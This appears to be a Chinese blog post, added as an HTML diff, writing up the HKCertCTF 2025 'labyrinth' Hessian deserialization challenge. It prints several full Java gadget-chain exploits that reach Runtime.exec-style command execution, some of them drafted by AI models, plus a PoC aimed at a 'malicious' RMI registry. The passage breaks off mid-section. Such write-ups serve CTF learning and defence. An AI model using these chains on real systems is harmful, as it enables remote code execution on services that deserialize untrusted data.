@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            HKCertCTF 2025 labyrinth
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>简单记录一下以纪念死磕这题的周末。人工队和 AI 大家族的 gpt-5-pro，gemini 一起思考，也未战胜。</p>
+<hr>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>自定义了一个 CustomProxy。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221232902714.png" alt="image-20251221232902714.png"></p>
+<p>开启了 AllowNonSerializable。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221232911283.png" alt="image-20251221232911283.png"></p>
+<p>依赖只有一个 hessian-lite，还是最新版。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221232931052.png" alt="image-20251221232931052.png"></p>
+<h1 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h1><p>先放最终解法吧，来自 AAA 战队发在discord的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org;</span><br><span class="line"></span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Input;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import org.example.labyrinth.model.CustomProxy;</span><br><span class="line">import sun.security.krb5.internal.ccache.FileCredentialsCache;</span><br><span class="line">import sun.tracing.ProbeSkeleton;</span><br><span class="line">import cn.org.unk.Util;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.TreeMap;</span><br><span class="line"></span><br><span class="line">public class EX &#123;</span><br><span class="line"></span><br><span class="line">    public static TreeMap&lt;Object,Object&gt; triggerTreeMap(Object eq1, Object eq2) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        TreeMap&lt;Object,Object&gt; treeMap = new TreeMap&lt;&gt;();</span><br><span class="line">        Util.setFieldValue(treeMap, &quot;size&quot;, 2);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; entryC = Class.forName(&quot;java.util.TreeMap$Entry&quot;);</span><br><span class="line">        Constructor&lt;?&gt; cons = entryC.getDeclaredConstructor(Object.class, Object.class, entryC);</span><br><span class="line">        cons.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        Object root = cons.newInstance(eq1, eq1, null);</span><br><span class="line">        Object left = cons.newInstance(eq2, eq2, root);</span><br><span class="line">        Object right = cons.newInstance(eq2, eq2, root);</span><br><span class="line"></span><br><span class="line">        Util.setFieldValue(root, &quot;left&quot;, left);</span><br><span class="line">        Util.setFieldValue(root, &quot;right&quot;, right);</span><br><span class="line"></span><br><span class="line">        Util.setFieldValue(treeMap, &quot;root&quot;, root);</span><br><span class="line"></span><br><span class="line">        return treeMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static Object getDTraceprobe(Object o2, Method m2) throws Exception &#123;</span><br><span class="line">        Object dtProbe = Util.createWithoutConstructor(Class.forName(&quot;sun.tracing.dtrace.DTraceProbe&quot;));</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         *    protected Class&lt;?&gt;[] parameters;</span><br><span class="line">         *  private Object proxy;</span><br><span class="line">    private Method declared_method;</span><br><span class="line">    private Method implementing_method;</span><br><span class="line"></span><br><span class="line">         */</span><br><span class="line">        Util.setFieldValue(dtProbe, &quot;proxy&quot;,  o2);</span><br><span class="line">        Util.setFieldValue(dtProbe, &quot;declared_method&quot;,  m2);</span><br><span class="line">        Util.setFieldValue(dtProbe, &quot;implementing_method&quot;,  m2);</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = m2.getParameterTypes();</span><br><span class="line">        Util.setFieldValue(dtProbe, &quot;parameters&quot;,  paramTypes);</span><br><span class="line">        return dtProbe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) Util.createWithoutConstructor(Class.forName(&quot;sun.tracing.MultiplexProvider&quot;));</span><br><span class="line">        Util.setFieldValue(invocationHandler, &quot;probes&quot;, new HashMap&lt;&gt;());</span><br><span class="line">        Util.setFieldValue(invocationHandler, &quot;active&quot;, true);</span><br><span class="line">        Util.setFieldValue(invocationHandler, &quot;providerType&quot;, File.class);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Method, Object&gt; probes = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Object o2 = FileCredentialsCache.acquireInstance();</span><br><span class="line">        Method m2 = FileCredentialsCache.class.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="line">        m2.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        String bashCmd = &quot;lol&quot;;</span><br><span class="line"></span><br><span class="line">        String params = &quot;calc&quot;;</span><br><span class="line"></span><br><span class="line">        Object dtProbe = getDTraceprobe(o2, m2);</span><br><span class="line"></span><br><span class="line">        Method methodRef = File.class.getMethod(&quot;compareTo&quot;, File.class);</span><br><span class="line"></span><br><span class="line">        probes.put(methodRef, dtProbe);</span><br><span class="line">        Util.setFieldValue(invocationHandler, &quot;probes&quot;, probes);</span><br><span class="line"></span><br><span class="line">        Object objCompareTo = new CustomProxy(invocationHandler, methodRef);</span><br><span class="line"></span><br><span class="line">        TreeMap treeMap = triggerTreeMap(objCompareTo, params);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output output = new Hessian2Output(baos);</span><br><span class="line">        output.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        output.writeObject(treeMap);</span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        byte[] arr0 = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        //System.out.println(&quot;obj1:&quot; + Ctf.enhex(arr0));</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(arr0);</span><br><span class="line">        Hessian2Input input = new Hessian2Input(bais);</span><br><span class="line">        input.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        System.out.println(&quot;readObject:&quot;);</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>调用栈如下。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221221200641.png" alt="image-20251221221200641.png"></p>
+<p>基本都是 invoke 调用。</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下面是当时我做题时候的思路。</p>
+<p>题目开了setAllowNonSerializable(true)，可以反序列化非 Serializable 的类</p>
+<p>题目给了一个自定义 CustomProxy，且 m3 这个方法可以采用反射修改 name 的形式绕过，达到任意方法调用，但是还缺一个关键的 InvocationHandler，这个 handler 要么自己可以直接调用到 sink，要么可以调用其他对象的方法，典型的就是 JdkDynamicAopProxy，但是这玩意不行，下面会细说。</p>
+<p>当前已经可以通过XString + HashMap + POJONode 的方式达到任意 getter 调用，但是缺少一个能利用的 getter。</p>
+<p>XString + HashMap 代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; map3 = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        POJONode node2 = Gadget.getPOJONode(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        map2.put(&quot;yy&quot;,new XString(&quot;1&quot;));</span><br><span class="line">        map2.put(&quot;zZ&quot;,node2);</span><br><span class="line"></span><br><span class="line">        map3.put(map1,&quot;1&quot;);</span><br><span class="line">        map3.put(map2,&quot;2&quot;);</span><br><span class="line"></span><br><span class="line">        map1.put(&quot;yy&quot;,node2);</span><br><span class="line">        map1.put(&quot;zZ&quot;,new XString(&quot;1&quot;));</span><br><span class="line"></span><br><span class="line">        byte[] serialize = serialize(map3);</span><br><span class="line"></span><br><span class="line">        deserialize(serialize);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以这道题现在是两种思路，一个是寻找一个合适的 InvocationHandler 可以到达 sink，第二个思路就是寻找 getter。</p>
+<h1 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h1><p>下面的代码是 AI 给的，虽然有一处细节没有注意，但是真的很强了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">import cn.org.unk.Util;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Input;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import org.example.labyrinth.model.CustomProxy;</span><br><span class="line">import org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line">import org.springframework.remoting.rmi.RmiClientInterceptor;</span><br><span class="line">import org.springframework.aop.target.SingletonTargetSource;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void deser() throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        Hessian2Input input = new Hessian2Input(new FileInputStream(&quot;payload.bin&quot;));</span><br><span class="line">        input.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        Object o = input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        deser();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void ser() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating POC...&quot;);</span><br><span class="line"></span><br><span class="line">        // 1. Create RmiClientInterceptor</span><br><span class="line">        RmiClientInterceptor rmiInterceptor = new RmiClientInterceptor();</span><br><span class="line">        rmiInterceptor.setServiceUrl(&quot;rmi://127.0.0.1:1099/evil&quot;); // Point to our malicious registry</span><br><span class="line">        rmiInterceptor.setServiceInterface(Comparable.class); // Must act as Comparable</span><br><span class="line"></span><br><span class="line">        Util.setFieldValue(rmiInterceptor, &quot;beanClassLoader&quot;, null);</span><br><span class="line"></span><br><span class="line">        // Note: we don&#x27;t call afterPropertiesSet(), so lookup happens lazily on invoke</span><br><span class="line"></span><br><span class="line">        // 2. Create AdvisedSupport and add the interceptor</span><br><span class="line">        AdvisedSupport advisedSupport = new AdvisedSupport();</span><br><span class="line">        advisedSupport.setTarget(new SingletonTargetSource(new Object())); // Dummy target</span><br><span class="line">        advisedSupport.addAdvice(rmiInterceptor);</span><br><span class="line">        advisedSupport.setInterfaces(Comparable.class);</span><br><span class="line"></span><br><span class="line">        // 3. Create JdkDynamicAopProxy</span><br><span class="line">        // JdkDynamicAopProxy is package-private/final in some versions, but public in others.</span><br><span class="line">        // We might need to use reflection to instantiate it if it&#x27;s not accessible.</span><br><span class="line">        // Assuming we are in the same package or it&#x27;s public.</span><br><span class="line">        // Wait, JdkDynamicAopProxy in the source I read is &quot;final class JdkDynamicAopProxy&quot;.</span><br><span class="line">        // It is package-private (no public modifier).</span><br><span class="line">        // So I cannot instantiate it directly from default package Poc.</span><br><span class="line">        // I need to use reflection to create it.</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;)</span><br><span class="line">                .getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        InvocationHandler aopProxy = (InvocationHandler) ctor.newInstance(advisedSupport);</span><br><span class="line"></span><br><span class="line">        // 4. Create CustomProxy wrapping the JdkDynamicAopProxy</span><br><span class="line">        // CustomProxy(InvocationHandler h)</span><br><span class="line">        CustomProxy customProxy = new CustomProxy(aopProxy, CustomProxy.class.getMethod(&quot;compareTo&quot;, Object.class));</span><br><span class="line"></span><br><span class="line">        // 5. Put into TreeMap to trigger compareTo</span><br><span class="line">        TreeMap&lt;Object, Object&gt; treeMap = new TreeMap&lt;&gt;();</span><br><span class="line">        treeMap.put(&quot;customProxy&quot;, &quot;trigger&quot;);</span><br><span class="line"></span><br><span class="line">        replaceKey(Util.getFieldValue(treeMap, &quot;root&quot;), &quot;customProxy&quot;, customProxy);</span><br><span class="line"></span><br><span class="line">        // 6. Serialize</span><br><span class="line">        ByteArrayOutputStream bao = new ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        Hessian2Output hessian2Output = new Hessian2Output(bao);</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        hessian2Output.writeObject(treeMap);</span><br><span class="line">        hessian2Output.close();</span><br><span class="line"></span><br><span class="line">        byte[] bytes = bao.toByteArray();</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(&quot;payload.bin&quot;);</span><br><span class="line">        fileOutputStream.write(bytes);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    private static void replaceKey(Object entry, Object targetKey, Object newKey) throws Exception &#123;</span><br><span class="line">        if (entry == null) return;</span><br><span class="line">        Class&lt;?&gt; entryClass = entry.getClass();</span><br><span class="line">        Field keyField = entryClass.getDeclaredField(&quot;key&quot;);</span><br><span class="line">        keyField.setAccessible(true);</span><br><span class="line">        Object key = keyField.get(entry);</span><br><span class="line"></span><br><span class="line">        if (key != null &amp;&amp; key.equals(targetKey)) &#123;</span><br><span class="line">            keyField.set(entry, newKey);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field leftField = entryClass.getDeclaredField(&quot;left&quot;);</span><br><span class="line">        leftField.setAccessible(true);</span><br><span class="line">        replaceKey(leftField.get(entry), targetKey, newKey);</span><br><span class="line"></span><br><span class="line">        Field rightField = entryClass.getDeclaredField(&quot;right&quot;);</span><br><span class="line">        rightField.setAccessible(true);</span><br><span class="line">        replaceKey(rightField.get(entry), targetKey, newKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这处细节就是：AdvisedSupport这家伙的methodCache属性是transient的，hessian不会恢复这个属性，导致JdkDynamicAopProxy在执行 invoke 的时候出现空指针异常。代码正向打（put 完直接 compare），是通的，反序列化后就不行了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221223026864.png" alt="image-20251221223026864.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221223036531.png" alt="image-20251221223036531.png"></p>
+<blockquote>
+<p>Exception in thread “main” java.lang.NullPointerException<br>at org.springframework.aop.framework.AdvisedSupport.getInterceptorsAndDynamicInterceptionAdvice(AdvisedSupport.java:468)<br>at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:225)<br>at org.example.labyrinth.model.CustomProxy.compareTo(CustomProxy.java:25)<br>at java.util.TreeMap.compare(TreeMap.java:1294)<br>at java.util.TreeMap.put(TreeMap.java:538)<br>at com.alibaba.com.caucho.hessian.io.MapDeserializer.doReadMap(MapDeserializer.java:143)<br>at com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:124)<br>at com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:96)<br>at com.alibaba.com.caucho.hessian.io.SerializerFactory.readMap(SerializerFactory.java:621)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2851)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2419)<br>at org.example.Poc.deser(Poc.java:21)<br>at org.example.Poc.main(Poc.java:27)</p>
+</blockquote>
+<h1 id="MethodInvokeTypeProvider"><a href="#MethodInvokeTypeProvider" class="headerlink" title="MethodInvokeTypeProvider"></a>MethodInvokeTypeProvider</h1><p>继续欣赏一下 Gemini-3-Pro-Preview(200k) 的杰作，也可以直接跳到最后面看简略版本。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example.c;</span><br><span class="line"></span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line">import org.springframework.aop.target.SingletonTargetSource;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.MarshalledObject;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">希望通过  MarshalledObject 打二次反序列化。</span><br><span class="line">还是用的是 SerializableTypeWrapper$MethodInvokeTypeProvider</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Generating payload...&quot;);</span><br><span class="line"></span><br><span class="line">        // 0. Compile EvilCalc class</span><br><span class="line">        compileEvilCalc();</span><br><span class="line">        byte[] evilBytes = Files.readAllBytes(Paths.get(&quot;EvilCalc.class&quot;));</span><br><span class="line"></span><br><span class="line">        // 1. Create malicious TemplatesImpl</span><br><span class="line">        Class&lt;?&gt; templatesClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);</span><br><span class="line">        Object templates = templatesClass.newInstance();</span><br><span class="line">        </span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123; evilBytes &#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;EvilCalc&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;).newInstance());</span><br><span class="line"></span><br><span class="line">        // 2. Wrap TemplatesImpl in MarshalledObject to bypass Hessian blacklist</span><br><span class="line">        MarshalledObject&lt;Object&gt; marshalledObject = new MarshalledObject&lt;&gt;(templates);</span><br><span class="line"></span><br><span class="line">        // 3. Create MethodInvokeTypeProvider chain to call marshalledObject.get().newTransformer()</span><br><span class="line">        </span><br><span class="line">        // We need a TypeProvider that returns the MarshalledObject.</span><br><span class="line">        // We can use MethodInvokeTypeProvider to call a static method (if possible) or instance method.</span><br><span class="line">        // Since we can&#x27;t easily create a TypeProvider that returns MarshalledObject directly (FieldTypeProvider needs field),</span><br><span class="line">        // we will use a chain.</span><br><span class="line">        </span><br><span class="line">        // Actually, for MethodInvokeTypeProvider to work, we need a method that returns Type.</span><br><span class="line">        // MarshalledObject.get() returns Object. This might fail validation on server.</span><br><span class="line">        // BUT assuming we want to try it (maybe validation is missing or bypassed).</span><br><span class="line"></span><br><span class="line">        // Step 3a: Create a TypeProvider that holds the MarshalledObject.</span><br><span class="line">        // We can use a Mock TypeProvider or proxy.</span><br><span class="line">        // Or we can use MethodInvokeTypeProvider calling a method that returns MarshalledObject?</span><br><span class="line">        </span><br><span class="line">        // Let&#x27;s use Reflection to create the MethodInvokeTypeProvider instance</span><br><span class="line">        Class&lt;?&gt; mitpClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);</span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; mitpCtor = mitpClass.getDeclaredConstructor(typeProviderClass, Method.class, int.class);</span><br><span class="line">        mitpCtor.setAccessible(true);</span><br><span class="line">        // We need a base TypeProvider.</span><br><span class="line">        // We can create a proxy for TypeProvider interface.</span><br><span class="line">        Object baseProvider = Proxy.newProxyInstance(</span><br><span class="line">            ClassLoader.getSystemClassLoader(),</span><br><span class="line">            new Class[]&#123;typeProviderClass&#125;,</span><br><span class="line">            new InvocationHandler() &#123;</span><br><span class="line">                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                    if (method.getName().equals(&quot;getType&quot;)) &#123;</span><br><span class="line">                        return marshalledObject; // This is WRONG. getType returns Type. MarshalledObject is not Type.</span><br><span class="line">                        // But wait, MethodInvokeTypeProvider.getType() calls invokeMethod(method, provider.getType()).</span><br><span class="line">                        // So provider.getType() is the TARGET object for the method call.</span><br><span class="line">                        // So if we return marshalledObject here, it will be the target.</span><br><span class="line">                    &#125;</span><br><span class="line">                    return null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        // Step 3b: Call marshalledObject.get()</span><br><span class="line">        // method: MarshalledObject.get()</span><br><span class="line">        Method getMethod = MarshalledObject.class.getMethod(&quot;get&quot;);</span><br><span class="line">        Object mitp1 = mitpCtor.newInstance(baseProvider, getMethod, 0);</span><br><span class="line">        </span><br><span class="line">        // mitp1.getType() -&gt; invokes marshalledObject.get() -&gt; returns TemplatesImpl.</span><br><span class="line">        </span><br><span class="line">        // Step 3c: Call templates.newTransformer()</span><br><span class="line">        // method: Templates.newTransformer()</span><br><span class="line">        Method newTransformerMethod = Templates.class.getMethod(&quot;newTransformer&quot;);</span><br><span class="line">        Object mitp2 = mitpCtor.newInstance(mitp1, newTransformerMethod, 0);</span><br><span class="line">        </span><br><span class="line">        // mitp2.getType() -&gt; invokes mitp1.getType().newTransformer() -&gt; templates.newTransformer().</span><br><span class="line">        </span><br><span class="line">        // 4. Wrap mitp2 in POJONode</span><br><span class="line">        // POJONode.toString() -&gt; Jackson -&gt; calls getters on mitp2.</span><br><span class="line">        // mitp2 has getType(). Jackson calls it.</span><br><span class="line">        POJONode node = new POJONode(mitp2);</span><br><span class="line"></span><br><span class="line">        node.toString();</span><br><span class="line"></span><br><span class="line">        System.exit(1);</span><br><span class="line">        </span><br><span class="line">        // 5. Trigger POJONode.toString() via XString</span><br><span class="line">        Class&lt;?&gt; xStringClass = Class.forName(&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;);</span><br><span class="line">        Constructor&lt;?&gt; xStringCtor = xStringClass.getDeclaredConstructor(String.class);</span><br><span class="line">        xStringCtor.setAccessible(true);</span><br><span class="line">        Object xString = xStringCtor.newInstance(&quot;test&quot;);</span><br><span class="line">        </span><br><span class="line">        Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(node, &quot;dummy&quot;);</span><br><span class="line">        map.put(xString, &quot;dummy&quot;);</span><br><span class="line">        </span><br><span class="line">        // XString.equals(node) -&gt; node.toString() -&gt; ...</span><br><span class="line">        </span><br><span class="line">        // 6. Serialize</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output out = new Hessian2Output(baos);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">        out.flush();</span><br><span class="line">        byte[] payload = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        // Save to file</span><br><span class="line">        File file = new File(&quot;payload.bin&quot;);</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(file);</span><br><span class="line">        fos.write(payload);</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;Payload generated to &quot; + file.getAbsolutePath());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void compileEvilCalc() throws Exception &#123;</span><br><span class="line">        String source = &quot;public class EvilCalc &#123;\n&quot; +</span><br><span class="line">                        &quot;    static &#123;\n&quot; +</span><br><span class="line">                        &quot;        try &#123;\n&quot; +</span><br><span class="line">                        &quot;            java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);\n&quot; +</span><br><span class="line">                        &quot;        &#125; catch (Exception e) &#123;&#125;\n&quot; +</span><br><span class="line">                        &quot;    &#125;\n&quot; +</span><br><span class="line">                        &quot;&#125;&quot;;</span><br><span class="line">        File sourceFile = new File(&quot;EvilCalc.java&quot;);</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(sourceFile);</span><br><span class="line">        fos.write(source.getBytes());</span><br><span class="line">        fos.close();</span><br><span class="line">        </span><br><span class="line">        Process p = Runtime.getRuntime().exec(&quot;javac EvilCalc.java&quot;);</span><br><span class="line">        p.waitFor();</span><br><span class="line">        if (p.exitValue() != 0) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;Compilation failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>他想干啥呢？</p>
+<p>先看 <code>org.springframework.core.SerializableTypeWrapper$TypeProxyInvocationHandler</code>  这个类，看他的 invoke，有一处方法调用。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221224033193.png" alt="image-20251221224033193.png"></p>
+<p>他想把 this.provider 设置成 <code>AnnotationInvocationHandler</code>，从而控制 getType的返回值为任意对象，比如一个 <code>MarshalledObject</code> ，然后把 method 设置成 <code>MarshalledObject#get</code> ，就能二次反序列化。 但是有个问题，就是 <code>getType</code> 的返回值是 <code>Type</code> 类型的，如果返回其他类型的对象会报错，所以这样行不通。</p>
+<p>同样的道理，<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code> 有一个 getter，看起来可以任意方法调用，实际上也不行，也是类型问题。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221225407403.png" alt="image-20251221225407403.png"></p>
+<h1 id="ResourceUtils"><a href="#ResourceUtils" class="headerlink" title="ResourceUtils"></a>ResourceUtils</h1><p>上面的 getType 是因为类型问题不能用，那存不存在 Type 的子类能够利用？Class 类不就是么？那就可以调用静态方法，先随便测试一个，比如  <code>ResourceUtils#getURL</code>，下面是代码：</p>
